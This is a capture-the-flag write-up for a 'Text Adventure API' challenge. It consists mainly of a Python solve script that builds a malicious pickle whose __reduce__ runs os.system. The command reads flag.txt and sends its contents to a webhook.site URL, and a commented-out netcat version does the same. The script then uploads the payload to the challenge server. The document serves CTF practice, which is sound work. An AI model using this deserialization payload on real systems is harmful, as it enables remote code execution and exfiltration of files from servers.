# Text Adventure API
## Description
Explore my kitchen!

https://text-adventure-api.chall.pwnoh.io/api
## Author
mbund
## Resources
`export.zip` - source code
## Solution
A `pickle` RCE hack, check [refence](https://davidhamann.de/2020/04/05/exploiting-python-pickle/).  
solve.py:  
```python
import pickle, json, os, requests

url = "https://text-adventure-api.chall.pwnoh.io/api/"
local_url = "http://localhost:5000/api/"

s = requests.Session()

def load(file):
    return json.loads(s.post(url + "load", files={"file": file}).text)

class Test:
    def keys(self) -> Iterable:
        return ["current_location"]
    def __getitem__(self, __key: str) -> str:
        global room
        if __key == 'current_location':
            room["start"]["objects"]["flag"] = "Hi"
            return "start"
        return super().__getitem__(__key)


class RCE:
    def __reduce__(self):
        # no `nc` in the server
        # cmd = ('echo -e "GET /[REDECATED]/$(cat flag.txt) HTTP/1.1\r\nHost: webhook.site\r\n\r\n" | nc webhook.site 80')
        cmd = 'python -c "import urllib.request; response = urllib.request.urlopen(\'https://webhook.site/[REDECATED]/$(cat flag.txt)\');"'
        return os.system, (cmd,)



with open("../data2.pkl", "wb") as f:
    f.write(pickle.dumps(RCE()))

# print(examine())
with open("../data2.pkl", "rb") as f:
    print(load(f))
    
```